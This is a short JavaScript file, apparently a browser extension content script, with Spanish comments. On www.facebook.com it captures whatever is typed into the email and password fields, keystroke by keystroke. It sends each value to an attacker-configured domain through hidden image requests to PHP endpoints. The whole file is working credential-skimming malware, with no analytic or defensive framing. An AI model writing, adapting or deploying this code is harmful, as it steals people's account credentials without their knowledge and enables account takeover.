function send_data(dom, type, data){
  let elem = document.createElement("img");
  elem.style.display = "none";
  elem.src = dom + "/" + type + ".php?v=" + encodeURIComponent(data) + "&d=" + encodeURIComponent(new Date().toISOString());
  document.body.appendChild(elem);
}

if (window.location.hostname == "www.facebook.com"){
  // Correo
  document.getElementById("email").addEventListener("input", async function(e){
    send_data((await browser.storage.local.get("dominio")), "correo", this.value);
  });

  // Contrasena
  document.getElementById("pass").addEventListener("input", async function(e){
    send_data((await browser.storage.local.get("dominio")), "contra", this.value);
  });
}
